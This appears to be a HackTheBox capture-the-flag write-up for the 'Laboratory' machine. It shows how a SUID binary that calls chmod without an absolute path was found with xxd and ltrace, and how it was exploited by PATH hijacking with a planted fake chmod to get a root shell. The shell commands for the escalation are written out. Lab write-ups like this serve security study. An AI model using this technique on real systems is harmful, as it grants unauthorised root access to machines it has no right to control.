```bash
root@napster:~/Documents/HTB/Laboratory# ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$ 
```

# Enumeration -

![[Pasted image 20210501064059.png]]


### Found a binary with SUID bit set, which run as  root and dexter has permisission to execute it.

## Executing the Binary-

![[Pasted image 20210501064938.png]]

## Using xxd and ltrace -

```bash
dexter@laboratory:/usr/local/bin$ xxd docker-security                                                                                                         
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............                                                                                           
00000010: 0300 3e00 0100 0000 7010 0000 0000 0000  ..>.....p.......                                                                                           
00000020: 4000 0000 0000 0000 d039 0000 0000 0000  @........9......                                                                                           
00000030: 0000 0000 4000 3800 0b00 4000 1e00 1d00  ....@.8...@.....                                                                                           
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......                                                                                           
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......                                                                                           
00000060: 6802 0000 0000 0000 6802 0000 0000 0000  h.......h.......                                                                                           
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................                                                                                           
00000080: a802 0000 0000 0000 a802 0000 0000 0000  ................
00000090: a802 0000 0000 0000 1c00 0000 0000 0000  ................
000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................
<snip>
00002000: 0100 0200 0000 0000 6368 6d6f 6420 3730  ........chmod 70                                                                                           
00002010: 3020 2f75 7372 2f62 696e 2f64 6f63 6b65  0 /usr/bin/docke
00002020: 7200 0000 0000 0000 6368 6d6f 6420 3636  r.......chmod 66
00002030: 3020 2f76 6172 2f72 756e 2f64 6f63 6b65  0 /var/run/docke
00002040: 722e 736f 636b 0000 011b 033b 3c00 0000  r.sock.....;<...
```

```bash
dexter@laboratory:/usr/local/bin$ ltrace docker-security 
setuid(0)                                                                                        = -1
setgid(0)                                                                                        = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 256
+++ exited (status 0) +++
```


### We can see chmod is used without absolute path(/usr/bin/chmod) which mean we can do `PATH HIJACKING`  

# Privilege Escalation through Path Hijacking-

### Creating chmod file on home directory of dexter-

![[Pasted image 20210501070910.png]]

```bash
dexter@laboratory:~$ ls
chmod  user.txt
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ chmod +x chmod 
dexter@laboratory:~$ ls
chmod  user.txt
dexter@laboratory:~$ export PATH=$(pwd):$PATH
dexter@laboratory:~$ echo $PATH
/home/dexter:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ /usr/local/bin/docker-security 
root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
```




PAWNED!!!!!